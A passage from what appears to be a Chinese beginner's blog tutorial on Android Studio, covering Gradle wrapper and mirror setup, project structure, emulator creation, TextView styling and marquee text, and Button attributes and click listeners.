class="line">distributionBase=GRADLE_USER_HOME</span><br><span class="line">distributionPath=wrapper/dists</span><br><span class="line">zipStoreBase=GRADLE_USER_HOME</span><br><span class="line">zipStorePath=wrapper/dists</span><br><span class="line">distributionUrl=http\://services.gradle.org/distributions/gradle-6.5-all.zip</span><br></pre></td></tr></tbody></table></figure><p>然后找到 gradle-6.5-all.zip 这就是你要下载的版本，去网上手动下载一个；</p><p>然后找到 <code>$User/.gradle/wrapper/dists</code>中创建一个对应版本的文件夹以及下面的一个SHA256签名的目录，直接将zip拷贝进去（无需解压缩）；</p><p>关闭项目，重新打开即可；</p><blockquote><p>强烈不推荐手动下载Gradle；</p><p><strong>你甚至都可以将上述配置中的<code>distributionUrl</code>修改为网上的一个地址，重新打开项目，这时项目会自动从这个地址下载Gradle，而避免手动下载、复制压缩包；</strong></p></blockquote><h4 id="③-使用本地Gradle"><a href="#③-使用本地Gradle" class="headerlink" title="③ 使用本地Gradle"></a><strong>③ 使用本地Gradle</strong></h4><p>如果本地存在了Gradle，可以使用本地的Gradle；</p><p>在<code>Android Studio</code>设置，找到<code>Gradle</code>，指定本地Gradle位置；</p><blockquote><p><strong>但是这样就无法实现Gradle Wrapper支持多版本构建的优势了！</strong></p></blockquote><h3 id="其他：Gradle依赖镜像源"><a href="#其他：Gradle依赖镜像源" class="headerlink" title="其他：Gradle依赖镜像源"></a><strong>其他：Gradle依赖镜像源</strong></h3><p>Gradle下载依赖较慢的问题，基本上都已经被讲烂了，解决方法就是：换镜像源！</p><p>把maven库地址改成阿里云的地址，找到根目录下的<code>build.gradle</code>，进行如下修改：</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">buildscript {</span><br><span class="line">    repositories {</span><br><span class="line">+       maven{url 'http://maven.aliyun.com/nexus/content/groups/public/'}</span><br><span class="line">+       maven{url "https://jitpack.io" }</span><br><span class="line">        google()</span><br><span class="line">-       // jcenter()</span><br><span class="line">-       // mavenCentral()</span><br><span class="line">    }</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line">allprojects {</span><br><span class="line">    repositories {</span><br><span class="line">+       maven{url 'http://maven.aliyun.com/nexus/content/groups/public/'}</span><br><span class="line">        google()</span><br><span class="line">-       // jcenter()</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><h2 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h2><p>了解项目结构可以让我们更容易学习</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">MyApplication</span><br><span class="line">.gradle: Gradle编译系统，版本由wrapper指定(无须手动修改)</span><br><span class="line">.idea: IDE所需要的文件(无须手动修改)</span><br><span class="line">app: 开发项目的所有代码和资源文件</span><br><span class="line">  build: app模块编译输出的文件</span><br><span class="line">  libs: 放置引用的类库文件</span><br><span class="line">  src: 放置应用的主要文件目录</span><br><span class="line">    AndroidTest: 单元测试目录</span><br><span class="line">    main: 主要的项目目录和代码</span><br><span class="line">      java: 项目的源代码</span><br><span class="line">      res: 项目的资源</span><br><span class="line">        drawable: 存放各种位图文件(.png，.jpg，.9png，.gif等)和drawable类型的XML文件</span><br><span class="line">        drawable-v24: 存放自定义Drawables类(Android API 24开始，可在XML中使用)</span><br><span class="line">        layout: 存放布局文件</span><br><span class="line">        menu: 存放菜单文件</span><br><span class="line">        mipmap-hdpi: 存放高分辨率图片资源</span><br><span class="line">        mipmap-mdpi: 存放中等分辨率图片资源</span><br><span class="line">        mipmap-xdpi: 存放超高分辨率图片资源</span><br><span class="line">        mipmap-xxdpi: 存放超超高分辨率图片资源</span><br><span class="line">        mipmap-xxxdpi: 存放超超超高分辨率图片资源</span><br><span class="line">        raw: 存放各种原生资源(音频，视频，一些XML文件等)</span><br><span class="line">        values: 存放各种配置资源（颜色，尺寸，样式，字符串等）</span><br><span class="line">        xml</span><br><span class="line">      AndroidManifest.xml: 项目的清单文件（名称、版本、SDK、权限等配置信息）</span><br><span class="line">    test</span><br><span class="line">    .gitignore: 忽略的文件或者目录</span><br><span class="line">    app.iml: app模块的配置文件</span><br><span class="line">    build.gradle: app模块的gradle编译文件</span><br><span class="line">    proguard-rules.pro: app模块的代码混淆配置文件</span><br><span class="line">  gradle: wrapper的jar和配置文件所在的位置 </span><br><span class="line">  .gitattributes: 用于设置文件的对比方式</span><br><span class="line">  .gitignore: 忽略的文件或者目录</span><br><span class="line">  build.gradle: 项目的gradle编译文件</span><br><span class="line">  gradle.properties: gradle相关的全局属性设置 没有会下载，有会自动配置</span><br><span class="line">  gradlew: 编译脚本，可以在命令行执行打包</span><br><span class="line">  gradlew.bat: windows下的gradle wrapper可执行文件</span><br><span class="line">  MyApplication.iml: 保存该模块的相关信息</span><br><span class="line">  README.md: 文本编辑器，记录一些相关信息</span><br><span class="line">  local.properties: 配置SDK/NDK所在的路径</span><br><span class="line">  setting.gradle: 设置相关的gradle脚本</span><br><span class="line">  External Libraries: 项目依赖的库，编译时自动下载</span><br></pre></td></tr></tbody></table></figure><h3 id="APP"><a href="#APP" class="headerlink" title="APP"></a>APP</h3><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">manifests</span><br><span class="line">AndroidManifest.xml: 项目的清单文件（名称、版本、SDK、权限等配置信息）</span><br><span class="line">java: 项目的源代码</span><br><span class="line">src: 放置应用的主要文件目录(子目录可参考Project的介绍)</span><br><span class="line">Gradle Scripts： gradle编译相关的脚本(具体文件的说明可参考Project的介绍)</span><br></pre></td></tr></tbody></table></figure><h1 id="开发前准备"><a href="#开发前准备" class="headerlink" title="开发前准备"></a>开发前准备</h1><p>在正式开发前，我们需要先配置好虚拟设备，方便我们开发时调试，IDEA提供两种调试方法。</p><h2 id="创建虚拟设备"><a href="#创建虚拟设备" class="headerlink" title="创建虚拟设备"></a>创建虚拟设备</h2><p>IDEA提供两种方式，分别是物理连接和虚拟连接，推荐使用第二种方法，更加方便。</p><h3 id="1-使用ADB连接手机"><a href="#1-使用ADB连接手机" class="headerlink" title="1.使用ADB连接手机"></a>1.使用ADB连接手机</h3><p>需要准备一台手机，打开手机的安卓调试ADB，然后连接电脑。</p><h3 id="2-创建一个虚拟设备"><a href="#2-创建一个虚拟设备" class="headerlink" title="2.创建一个虚拟设备"></a>2.创建一个虚拟设备</h3><p>创建一个虚拟设备，通过打开右侧菜单栏的 Device Manager （设备管理），点击加号创建一个新的虚拟设备。</p><p>点击后进入创建页面，左栏是提供的个各种不同的设备选择，这里选择手机（Phone）。</p><p>然后在右侧可以看到不同尺寸和分辨率的手机，选择合适的就可以。</p><p>下一步后，就是选择不同的手机系统了，官方提供了多种安卓版本，选择自己需要的就好，在Target一栏中可以看到不同的安卓版本。</p><p>点击Release Name一栏对应的系统名称旁边的下载按钮，同意协议后，开始自动下载系统SDK到你的项目路径中，下载完成后，继续点击下一步直到完成安装即可，就此已经成功创建好了对应的虚拟设备。</p><h2 id="启动虚拟设备"><a href="#启动虚拟设备" class="headerlink" title="启动虚拟设备"></a>启动虚拟设备</h2><p>运行虚拟设备需要找到右栏中的 Device Manager （设备管理）,看到你创建的设备后，点击运行即可。</p><p>运行后可以在 Running Devices （运行中设备） 里看到。</p><h1 id="开发"><a href="#开发" class="headerlink" title="开发"></a>开发</h1><h2 id="TextView"><a href="#TextView" class="headerlink" title="TextView"></a>TextView</h2><p>使用TextView可以在容器中创建一个文本，通过设置不同的属性改变文本的样式，包括颜色，尺寸，排版等等。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">LinearLayout</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:app</span>=<span class="string">"http://schemas.android.com/apk/res-auto"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xmlns:tools</span>=<span class="string">"http://schemas.android.com/tools"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/main"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">tools:context</span>=<span class="string">".MainActivity"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">TextView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/tv_one"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:text</span>=<span class="string">"hello world"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textColor</span>=<span class="string">"@color/black"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:textStyle</span>=<span class="string">"italic"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:background</span>=<span class="string">"#FFFF0000"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:gravity</span>=<span class="string">"center"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">TextView</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">LinearLayout</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在上述代码中，有一些属性的值是@开头，这是使用了规定好的样式，在正式开发中，不会将属性值直接写在代码中，而是在values文件夹里定义好不同的String，在组件里引用即可。</p><p>比如</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">android:id="@+id/tv_one"</span><br></pre></td></tr></tbody></table></figure><p>实际上是为了让MainActivity.java里的findViewById方法使用</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">setContentView(R.layout.activity_main);</span><br><span class="line"><span class="type">TextView</span> <span class="variable">tv_one</span> <span class="operator">=</span> findViewById(R.id.tv_one);</span><br><span class="line">tv_one.setText(<span class="string">"Hello Lain"</span>);</span><br></pre></td></tr></tbody></table></figure><p>通过ID寻找到组件后，使用Set方法改变组件的其他属性值，这里将TextView的Text修改为Hello Lain，有趣的是，我已经在xml的组件里也定义了Text的属性值为 Hello World</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">android:text="hello world"</span><br></pre></td></tr></tbody></table></figure><p>这种情况会优先Java代码，所以Hello World被修改为Hello Lain。</p><p>另一个情况是使用已经定义好的属性值，比如</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">android:textColor="@color/black"</span><br></pre></td></tr></tbody></table></figure><p>实际上这个值被存储在app\src\main\res\values\colors.xml里，如下</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">color</span> <span class="attr">name</span>=<span class="string">"black"</span>&gt;</span>#FF000000<span class="tag">&lt;/<span class="name">color</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">color</span> <span class="attr">name</span>=<span class="string">"white"</span>&gt;</span>#FFFFFFFF<span class="tag">&lt;/<span class="name">color</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>在这个目录下，还有其他的xml文件，对应着不同的使用场景，默认有三个分别是，colors.xml负责定义好的颜色样式，strings.xml负责项目中的所有显示文字，themes.xml负责主题。</p><p>比如我希望TextView的Text属性值为Hello Lain，我可以直接在strings.xml里添加一个值，这样每次使用相同的值，我直接调用这里的名字即可。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>financing<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"lain"</span>&gt;</span>Hello Lain<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>调用时</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">android:text="@string/lain"</span><br></pre></td></tr></tbody></table></figure><h3 id="属性"><a href="#属性" class="headerlink" title="属性"></a>属性</h3><table><thead><tr><th>属性 (Attribute)</th><th>描述 (Description)</th></tr></thead><tbody><tr><td>text</td><td>设置文本内容 (Sets the text content)</td></tr><tr><td>textColor</td><td>设置文本颜色 (Sets the text color)</td></tr><tr><td>textSize</td><td>设置文本大小 (Sets the text size)</td></tr><tr><td>textStyle</td><td>设置文本样式，如粗体、斜体 (Sets text style such as bold, italic)</td></tr><tr><td>gravity</td><td>设置文本的对齐方式 (Sets the text alignment)</td></tr><tr><td>fontFamily</td><td>设置文本字体 (Sets the text font family)</td></tr><tr><td>padding</td><td>设置文本的内边距 (Sets the text padding)</td></tr><tr><td>background</td><td>设置文本的背景 (Sets the text background)</td></tr><tr><td>maxLines</td><td>设置最大行数 (Sets the maximum number of lines)</td></tr><tr><td>singleLine</td><td>设置是否单行显示 (Sets whether to display in a single line)</td></tr><tr><td>ellipsize</td><td>设置超出范围时的省略方式 (Sets the ellipsis mode for overflow)</td></tr></tbody></table><h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><table><thead><tr><th>属性 (Attribute)</th><th>描述 (Description)</th></tr></thead><tbody><tr><td>shadowColor</td><td>设置阴影的颜色 (Sets the color of the shadow)</td></tr><tr><td>shadowDx</td><td>设置阴影在水平方向的偏移量 (Sets the horizontal offset of the shadow)</td></tr><tr><td>shadowDy</td><td>设置阴影在垂直方向的偏移量 (Sets the vertical offset of the shadow)</td></tr><tr><td>shadowRadius</td><td>设置阴影的半径 (Sets the radius of the shadow)</td></tr></tbody></table><h3 id="跑马灯"><a href="#跑马灯" class="headerlink" title="跑马灯"></a>跑马灯</h3><p>想要实现跑马灯需要设置5个属性分别为:</p><p>android:singleLine:内容单行显示</p><p>android:focusable:是否可以获取焦点</p><p>android:focusablelnTouchMode:用于控制视图在触摸模式下是否可以聚焦</p><p>android:ellipsize:在哪里省略文本</p><p>android:marqueeRepeatLimit:字幕动画重复的次数</p><p>首先修改文字内容，让其无法一行显示完全:</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">resources</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"app_name"</span>&gt;</span>financing<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span> <span class="attr">name</span>=<span class="string">"lain"</span>&gt;</span>Hello Lain,Hello Lain,Hello Lain,Hello Lain,Hello Lain,Hello Lain,Hello Lain,Hello Lain,Hello Lain<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">resources</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>通过添加这五个属性实现文字跑马灯效果</p><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">android:singleLine="true"</span><br><span class="line">android:focusable="true"</span><br><span class="line">android:focusableInTouchMode="true"</span><br><span class="line">android:ellipsize="marquee"</span><br><span class="line">android:marqueeRepeatLimit="marquee_forever"</span><br><span class="line">android:clickable="true"</span><br></pre></td></tr></tbody></table></figure><p>除了上述五个属性外，还需要添加一个获取点击焦点的属性，这样当点击后返回为true,开始循环跑马灯。</p><p>这样实现的跑马灯效果必须点击后才能使用，这样并不够高效，所以接下来通过自定义一个组件来实现无需点击自动获取焦点的功能。</p><p>通过在com.example里创建一个类，并且继承原组件，此时需要添加构造函数后才能正常使用，最后在重写判断焦点的方法返回为true，这样不论点击，都会循环重复。</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//当前类:com.example.TextViewLain</span></span><br><span class="line"><span class="keyword">package</span> com.example.financing;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.content.Context;</span><br><span class="line"><span class="keyword">import</span> android.util.AttributeSet;</span><br><span class="line"><span class="keyword">import</span> android.widget.TextView;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> androidx.annotation.Nullable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TextViewLain</span> <span class="keyword">extends</span> <span class="title class_">TextView</span> {</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TextViewLain</span><span class="params">(Context context)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TextViewLain</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, attrs);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">TextViewLain</span><span class="params">(Context context, <span class="meta">@Nullable</span> AttributeSet attrs, <span class="type">int</span> defStyleAttr)</span> {</span><br><span class="line">        <span class="built_in">super</span>(context, attrs, defStyleAttr);</span><br><span class="line">    }</span><br><span class="line"></span><br><span class="line"><span class="comment">//    重写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFocused</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">super</span>.isFocused();</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这段代码是Java中的一个方法重写（override）。它重写了一个名为<code>isFocused()</code>的方法，该方法原本是从父类（superclass）继承而来的。在重写中，它调用了<code>super.isFocused()</code>，意味着它调用了父类中的<code>isFocused()</code>方法。这个方法的作用是判断当前对象是否具有焦点（focus）。</p><p>更改返回值:</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//    重写</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isFocused</span><span class="params">()</span> {</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    }</span><br></pre></td></tr></tbody></table></figure><p>由于我们重写了TextView，在xml中使用它也应该调用新的类，所以变成了这样:</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">com.example.financing.TextViewLain</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/tv_one"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"@string/lain"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textColor</span>=<span class="string">"@color/black"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:textStyle</span>=<span class="string">"italic"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:background</span>=<span class="string">"#FFFF0000"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:gravity</span>=<span class="string">"center"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:singleLine</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:focusable</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:focusableInTouchMode</span>=<span class="string">"true"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:ellipsize</span>=<span class="string">"marquee"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:marqueeRepeatLimit</span>=<span class="string">"marquee_forever"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">com.example.financing.TextViewLain</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>再次运行，会发现自动实现了跑马灯效果。</p><h2 id="Button"><a href="#Button" class="headerlink" title="Button"></a>Button</h2><p>Button类继承于TextView</p><h3 id="基本属性"><a href="#基本属性" class="headerlink" title="基本属性"></a>基本属性</h3><table><thead><tr><th>属性 (Attribute)</th><th>描述 (Description)</th></tr></thead><tbody><tr><td><code>android:text</code></td><td>设置按钮显示的文本 (Sets the text displayed on the button)</td></tr><tr><td><code>android:id</code></td><td>按钮的唯一标识符 (Unique identifier for the button)</td></tr><tr><td><code>android:onClick</code></td><td>按钮点击时触发的方法 (Method to be invoked when the button is clicked)</td></tr><tr><td><code>android:background</code></td><td>设置按钮的背景 (Sets the background for the button) tip:因为更新的原因，使用这个属性需要将values\themes.xml里改为DarkActionBar.Bridge才可以使用</td></tr><tr><td><code>android:layout_width</code></td><td>设置按钮的宽度 (Sets the width of the button)</td></tr><tr><td><code>android:layout_height</code></td><td>设置按钮的高度 (Sets the height of the button)</td></tr><tr><td><code>android:enabled</code></td><td>设置按钮是否可用 (Sets whether the button is enabled)</td></tr><tr><td><code>android:visibility</code></td><td>设置按钮的可见性 (Sets the visibility of the button)</td></tr></tbody></table><h3 id="位置属性"><a href="#位置属性" class="headerlink" title="位置属性"></a>位置属性</h3><table><thead><tr><th><code>android:layout_gravity</code></th><th>按钮的布局位置。</th></tr></thead><tbody><tr><td><code>android:gravity</code></td><td>按钮内文本的对齐方式。</td></tr><tr><td><code>android:textSize</code></td><td>按钮文本的字体大小。</td></tr><tr><td><code>android:textColor</code></td><td>按钮文本的颜色。</td></tr><tr><td><code>android:padding</code></td><td>按钮内边距。</td></tr><tr><td><code>android:layout_margin</code></td><td>按钮外边距。</td></tr><tr><td><code>android:layout_alignParentLeft</code></td><td>按钮是否与父容器的左边对齐。</td></tr><tr><td><code>android:layout_alignParentRight</code></td><td>按钮是否与父容器的右边对齐。</td></tr><tr><td><code>android:layout_alignParentTop</code></td><td>按钮是否与父容器的顶部对齐。</td></tr><tr><td><code>android:layout_alignParentBottom</code></td><td>按钮是否与父容器的底部对齐。</td></tr><tr><td><code>android:layout_alignParentStart</code></td><td>按钮是否与父容器的开始位置对齐。</td></tr><tr><td><code>android:layout_alignParentEnd</code></td><td>按钮是否与父容器的结束位置对齐。</td></tr><tr><td><code>android:layout_centerHorizontal</code></td><td>按钮是否水平居中。</td></tr><tr><td><code>android:layout_centerVertical</code></td><td>按钮是否垂直居中。</td></tr><tr><td><code>android:layout_toLeftOf</code></td><td>按钮位于某个视图的左侧。</td></tr><tr><td><code>android:layout_toRightOf</code></td><td>按钮位于某个视图的右侧。</td></tr><tr><td><code>android:layout_above</code></td><td>按钮位于某个视图的上方。</td></tr><tr><td><code>android:layout_below</code></td><td>按钮位于某个视图的下方。</td></tr><tr><td><code>android:layout_alignLeft</code></td><td>按钮是否与另一个视图的左边对齐。</td></tr><tr><td><code>android:layout_alignRight</code></td><td>按钮是否与另一个视图的右边对齐。</td></tr><tr><td><code>android:layout_alignTop</code></td><td>按钮是否与另一个视图的顶部对齐。</td></tr><tr><td><code>android:layout_alignBottom</code></td><td>按钮是否与另一个视图的底部对齐。</td></tr></tbody></table><h3 id="点击改变背景颜色"><a href="#点击改变背景颜色" class="headerlink" title="点击改变背景颜色"></a>点击改变背景颜色</h3><p>如果要实现点击改变按钮背景颜色的效果，和html中使用判断是否点击的属性改变值不同，需要根据规则在res里编写具体规则，在xml中引用规则即可。</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_width</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:layout_height</span>=<span class="string">"100dp"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:backgroundTint</span>=<span class="string">"@color/btn_color"</span></span></span><br><span class="line"><span class="tag">      <span class="attr">android:text</span>=<span class="string">"hello"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>创建color文件夹和具体xml，然后编写代码:</p><p>来自:res/color/btn_color.xml</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">"1.0"</span> encoding=<span class="string">"utf-8"</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">selector</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:color</span>=<span class="string">"@color/black"</span> <span class="attr">android:state_pressed</span>=<span class="string">"true"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:color</span>=<span class="string">"#EFEFEF"</span>/&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">selector</span>&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>判断点击后为true，改变颜色为balck，否则默认情况为白色#EFEFEF</p><p>举一反三，其他情况也是使用同样的方法进行引用和判断。</p><h3 id="点击事件"><a href="#点击事件" class="headerlink" title="点击事件"></a>点击事件</h3><p>当你在Android Studio中创建一个按钮（Button）时，你通常会想要添加一个点击事件，以便在用户点击按钮时执行特定的操作。以下是几种常见的按钮点击事件及其使用方法：</p><h4 id="1-使用匿名内部类"><a href="#1-使用匿名内部类" class="headerlink" title="1. 使用匿名内部类"></a>1. 使用匿名内部类</h4><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">button.setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() {</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View v)</span> {</span><br><span class="line">        <span class="comment">// 在此处添加点击事件的操作</span></span><br><span class="line">    }</span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h4 id="2-使用Lambda表达式（适用于Java-8及以上）"><a href="#2-使用Lambda表达式（适用于Java-8及以上）" class="headerlink" title="2. 使用Lambda表达式（适用于Java 8及以上）"></a>2. 使用Lambda表达式（适用于Java 8及以上）</h4><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line">button.setOnClickListener(v -&gt; {</span><br><span class="line">    <span class="comment">// 在此处添加点击事件的操作</span></span><br><span class="line">});</span><br></pre></td></tr></tbody></table></figure><h4 id="3-在-XML-中添加-onClick-属性（不推荐使用，仅适用于单一事件）"><a href="#3-在-XML-中添加-onClick-属性（不推荐使用，仅适用于单一事件）" class="headerlink" title="3. 在 XML 中添加 onClick 属性（不推荐使用，仅适用于单一事件）"></a>3. 在 XML 中添加 onClick 属性（不推荐使用，仅适用于单一事件）</h4><p>在布局文件中添加 onClick 属性：</p><figure class="highlight xml"><table><tbody><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Button</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:id</span>=<span class="string">"@+id/button"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"wrap_content"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:text</span>=<span class="string">"Click me!"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:onClick</span>=<span class="string">"onButtonClick"</span> /&gt;</span></span><br></pre></td></tr></tbody></table></figure><p>然后在相应的活动（Activity）中添加一个公共方法：</p><figure class="highlight java"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onButtonClick</span><span class="params">(View view)</span> {</span><br><span class="line">    <span class="comment">// 在此处添加点击事件的操作</span></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p>这些是一些常见的按钮点击事件的使用方法。你可以根据自己的需要选择其中一种或多种来实现按钮的点击功能。</p><p>在 Android Studio 中，按钮可以响应多种点击事件以及触摸事件。以下是一些常见的按钮事件类型：</p><h4 id="点击事件（onClick）"><a href="#点击事件（onClick）" class="headerlink" title="点击事件（onClick）"></a>点击事件（onClick）</h4><p>点击事件是用户单击按钮时触发的事件。当用户点击按钮时，执行预定义的操作。</p><h4 id="长按事件（onLongClick）"><a href="#长按事件（onLongClick）" class="headerlink" title="长按事件（onLongClick）"></a>长按事件（onLongClick）</h4><p>长按事件是用户长时间按住按钮时触发的事件。通常用于触发需要长时间按住才执行的操作，例如弹出上下文菜单或启动拖放操作。</p><h4 id="触摸事件（onTouch）"><a href="#触摸事件（onTouch）" class="headerlink" title="触摸事件（onTouch）"></a>触摸事件（onTouch）</h4><p>触摸事件是用户触摸按钮（包括按下、移动和抬起）时触发的事件。可以根据手指在按钮上的动作执行不同的操作，例如实现自定义的手势识别或按钮效果。</p><h4 id="按下事件（onPress）"><a href="#按下事件（onPress）" class="headerlink" title="按下事件（onPress）"></a>按下事件（onPress）</h4><p>按下事件是用户按下按钮时触发的事件，通常在用户按下按钮但尚未释放时执行。与点击事件不同，按下事件不需要用户释放按钮即可触发。</p><h4 id="释放事件（onRelease）"><a href="#释放事件（onRelease）" class="headerlink" 